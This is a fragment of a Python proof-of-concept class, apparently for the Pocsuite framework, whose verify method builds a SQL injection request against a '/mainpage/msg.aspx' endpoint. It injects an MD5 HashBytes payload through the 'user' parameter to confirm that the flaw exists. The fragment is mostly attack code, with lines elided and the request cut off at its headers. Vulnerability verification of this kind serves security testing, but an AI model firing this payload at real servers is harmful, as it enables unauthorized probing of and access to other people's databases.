...
class POC(POCBase):
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        ...
        path="/mainpage/msg.aspx?user=1' and (SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','"+str_num+"')))=1 --"
        url = self.url + path
        headers={
